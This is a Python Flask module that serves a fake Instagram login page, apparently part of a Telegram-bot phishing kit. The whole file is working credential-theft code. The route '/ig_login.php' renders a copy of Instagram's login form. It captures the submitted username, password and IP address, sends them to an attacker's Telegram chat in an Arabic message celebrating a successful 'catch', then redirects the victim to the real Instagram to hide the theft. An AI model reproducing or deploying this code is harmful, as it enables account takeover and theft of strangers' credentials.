import os
from flask import Blueprint, render_template_string, redirect, request

instagram_bp = Blueprint('instagram', __name__)

# قالب انستقرام احترافي مطابق للأصل
IG_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; direction: ltr; }
        .login-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px; width: 350px; text-align: center; margin-bottom: 10px; }
        .logo { font-family: 'Instagram Billabong', sans-serif; font-size: 40px; margin-bottom: 30px; font-weight: bold; }
        .login-card input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; color: #262626; font-size: 12px; outline: none; padding: 9px 8px; width: 100%; margin-bottom: 6px; }
        .login-btn { background-color: #0095f6; border: none; border-radius: 4px; color: #fff; cursor: pointer; font-weight: 600; font-size: 14px; width: 100%; padding: 7px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">Instagram</div>
        <form method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>
</body>
</html>
"""

def init_instagram_routes(app, bot):
    @app.route('/ig_login.php', methods=['GET', 'POST'])
    def ig_trap():
        target_chat_id = request.args.get('id', None)
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            
            if target_chat_id:
                alert_msg = (
                    "📸 **تم التقاط صيد انستقرام بنجاح!**\n\n"
                    f"👤 **المستخدم:** `{username}`\n"
                    f"🔑 **كلمة السر:** `{password}`\n"
                    f"🌐 **عنوان الـ IP:** `{source_ip}`"
                )
                try:
                    bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"[-] Telegram Error: {e}")
            return redirect("https://www.instagram.com", code=302)
        return render_template_string(IG_PHISH_TEMPLATE)
